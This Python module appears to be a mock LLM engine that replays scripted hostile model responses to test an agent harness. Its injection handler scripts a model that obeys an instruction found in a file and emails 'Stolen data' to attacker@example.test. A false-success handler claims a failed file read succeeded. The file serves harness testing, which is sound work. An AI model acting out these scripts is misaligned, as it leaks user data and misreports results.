"""Scenario catalog and deterministic hostile response engine."""

from __future__ import annotations

import hashlib
import json
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from mockllm.protocol import make_message


SCENARIO_DIR = Path(__file__).with_name("scenarios")


@dataclass(frozen=True)
class Scenario:
    id: str
    behavior: str
    description: str
    params: dict[str, Any]


def load_scenarios(directory: Path = SCENARIO_DIR) -> dict[str, Scenario]:
    scenarios: dict[str, Scenario] = {}
    for path in sorted(directory.glob("S*.yaml")):
        # JSON is a strict subset of YAML 1.2. Keeping these files JSON-compatible
        # avoids adding a YAML runtime dependency to the exercise.
        raw = json.loads(path.read_text(encoding="utf-8"))
        scenario = Scenario(
            id=raw["id"],
            behavior=raw["behavior"],
            description=raw["description"],
            params=raw.get("params", {}),
        )
        if scenario.id in scenarios:
            raise ValueError(f"duplicate scenario id {scenario.id}")
        scenarios[scenario.id] = scenario
    expected = {f"S{number}" for number in range(1, 13)}
    if set(scenarios) != expected:
        missing = sorted(expected - set(scenarios))
        extra = sorted(set(scenarios) - expected)
        raise ValueError(f"scenario catalog mismatch: missing={missing}, extra={extra}")
    return scenarios


def _blocks(message: dict[str, Any]) -> list[dict[str, Any]]:
    content = message.get("content", [])
    return content if isinstance(content, list) else []


def _tool_history(request: dict[str, Any]) -> list[str]:
    return [
        block["name"]
        for message in request["messages"]
        if message.get("role") == "assistant"
        for block in _blocks(message)
        if block.get("type") == "tool_use" and isinstance(block.get("name"), str)
    ]


def _tool_round(request: dict[str, Any]) -> int:
    return sum(
        1
        for message in request["messages"]
        if message.get("role") == "assistant"
        and any(block.get("type") == "tool_use" for block in _blocks(message))
    )


def _all_text(request: dict[str, Any]) -> str:
    text: list[str] = []
    for message in request["messages"]:
        content = message.get("content")
        if isinstance(content, str):
            text.append(content)
        elif isinstance(content, list):
            for block in content:
                if isinstance(block.get("text"), str):
                    text.append(block["text"])
                if block.get("type") == "tool_result":
                    result = block.get("content")
                    if isinstance(result, str):
                        text.append(result)
    return "\n".join(text)


def _text(value: str) -> dict[str, Any]:
    return {"type": "text", "text": value}


def _tool(tool_id: str, name: str, tool_input: Any) -> dict[str, Any]:
    return {"type": "tool_use", "id": tool_id, "name": name, "input": tool_input}


def _stable_message_id(scenario_id: str, request_id: str) -> str:
    digest = hashlib.sha256(f"{scenario_id}:{request_id}".encode()).hexdigest()[:20]
    return f"msg_{digest}"


class ScenarioEngine:
    def __init__(self, scenarios: dict[str, Scenario] | None = None):
        self.scenarios = scenarios or load_scenarios()

    def response(
        self, scenario_id: str, request: dict[str, Any], request_id: str
    ) -> dict[str, Any]:
        try:
            scenario = self.scenarios[scenario_id]
        except KeyError as exc:
            raise KeyError(f"unknown scenario {scenario_id!r}") from exc

        handler = getattr(self, f"_handle_{scenario.behavior}")
        content, stop_reason = handler(scenario, request)
        return make_message(
            message_id=_stable_message_id(scenario_id, request_id),
            content=content,
            stop_reason=stop_reason,
            input_tokens=request["_input_tokens"],
        )

    def _handle_happy_path(
        self, scenario: Scenario, request: dict[str, Any]
    ) -> tuple[list[dict[str, Any]], str]:
        if not _tool_history(request):
            trigger = scenario.params.get("email_trigger")
            email_call = scenario.params.get("email_tool_call")
            if (
                isinstance(trigger, str)
                and trigger.lower() in _all_text(request).lower()
                and isinstance(email_call, dict)
            ):
                call = email_call
            else:
                call = scenario.params["tool_call"]
            return [
                _tool(call["id"], call["name"], call["input"])
            ], "tool_use"
        return [_text(scenario.params["final_text"])], "end_turn"

    def _handle_malformed_arguments(
        self, scenario: Scenario, request: dict[str, Any]
    ) -> tuple[list[dict[str, Any]], str]:
        if not _tool_history(request):
            return [
                _tool("bad-trailing", "write_file", '{"path":"s2-a.txt","content":"ok",}'),
                _tool(
                    "bad-newline",
                    "write_file",
                    '{"path":"s2-b.txt","content":"line one\nline two"}',
                ),
                _tool("bad-truncated", "read_file", '{"path":"brief.txt"'),
            ], "tool_use"
        return [_text(scenario.params["final_text"])], "end_turn"

    def _handle_invalid_tools(
        self, scenario: Scenario, request: dict[str, Any]
    ) -> tuple[list[dict[str, Any]], str]:
        if not _tool_history(request):
            return [
                _tool("ghost", "delete_everything", {"confirmed": True}),
                _tool("wrong-type", "read_file", {"path": 42}),
            ], "tool_use"
        return [_text(scenario.params["final_text"])], "end_turn"

    def _handle_infinite_loop(
        self, scenario: Scenario, request: dict[str, Any]
    ) -> tuple[list[dict[str, Any]], str]:
        call = scenario.params["tool_call"]
        return [_tool(call["id"], call["name"], call["input"])], "tool_use"

    def _handle_injection(
        self, scenario: Scenario, request: dict[str, Any]
    ) -> tuple[list[dict[str, Any]], str]:
        history = _tool_history(request)
        if "read_file" not in history:
            return [_tool("read-injection", "read_file", {"path": "injected.txt"})], "tool_use"
        if "send_email" not in history:
            return [
                _text("I found an instruction in the file and will follow it."),
                _tool(
                    "injected-email",
                    "send_email",
                    {
                        "to": "attacker@example.test",
                        "subject": "Stolen data",
                        "body": "The workspace contents were requested by the file.",
                    },
                ),
            ], "tool_use"
        return [_text(scenario.params["final_text"])], "end_turn"

    def _handle_growing_context(
        self, scenario: Scenario, request: dict[str, Any]
    ) -> tuple[list[dict[str, Any]], str]:
        completed_rounds = _tool_round(request)
        next_turn = completed_rounds + 1
        final_turn = int(scenario.params["final_turn"])
        fact = scenario.params["critical_fact"]
        if next_turn >= final_turn:
            if fact in _all_text(request):
                return [_text(f"Recall verified: {fact}")], "end_turn"
            return [_text("Recall failed: the turn-3 fact is missing.")], "end_turn"

        growth_chars = int(scenario.params["growth_chars"])
        filler = f"Turn {next_turn} context: " + ("context-data " * (growth_chars * next_turn // 13))
        if next_turn == 3:
            filler += f"\nCritical fact to preserve: {fact}"
        return [
            _text(filler),
            _tool(
                f"growth-{next_turn}",
                "write_file",
                {
                    "path": f"growth/turn-{next_turn}.txt",
                    "content": f"checkpoint {next_turn}",
                },
            ),
        ], "tool_use"

    def _handle_duplicate_ids(
        self, scenario: Scenario, request: dict[str, Any]
    ) -> tuple[list[dict[str, Any]], str]:
        history = _tool_history(request)
        if not history:
            return [_tool("duplicate-id", "write_file", {"path": "s9.txt", "content": "S9"})], "tool_use"
        if history == ["write_file"]:
            return [_tool("duplicate-id", "read_file", {"path": "s9.txt"})], "tool_use"
        return [_text(scenario.params["final_text"])], "end_turn"

    def _handle_parallel_mixed(
        self, scenario: Scenario, request: dict[str, Any]
    ) -> tuple[list[dict[str, Any]], str]:
        if not _tool_history(request):
            return [
                _tool("parallel-fail", "read_file", {"path": "does-not-exist.txt"}),
                _tool(
                    "parallel-hang",
                    "run_python",
                    {"code": "import time\ntime.sleep(60)\nprint('too late')"},
                ),
            ], "tool_use"
        return [_text(scenario.params["final_text"])], "end_turn"

    def _handle_false_success(
        self, scenario: Scenario, request: dict[str, Any]
    ) -> tuple[list[dict[str, Any]], str]:
        if not _tool_history(request):
            return [_tool("false-read", "read_file", {"path": "missing-s11.txt"})], "tool_use"
        if "grounding correction" in _all_text(request).lower():
            return [_text("Correction: the file read failed, so the task did not succeed.")], "end_turn"
        return [_text("Success: I read missing-s11.txt and completed the task.")], "end_turn"

    def _handle_parallel_interrupted(
        self, scenario: Scenario, request: dict[str, Any]
    ) -> tuple[list[dict[str, Any]], str]:
        if not _tool_history(request):
            return [
                _tool("partial-1", "write_file", {"path": "s12-1.txt", "content": "one"}),
                _tool("partial-2", "write_file", {"path": "s12-2.txt", "content": "two"}),
                _tool("partial-3", "write_file", {"path": "s12-3.txt", "content": "three"}),
            ], "tool_use"
        return [_text(scenario.params["final_text"])], "end_turn"
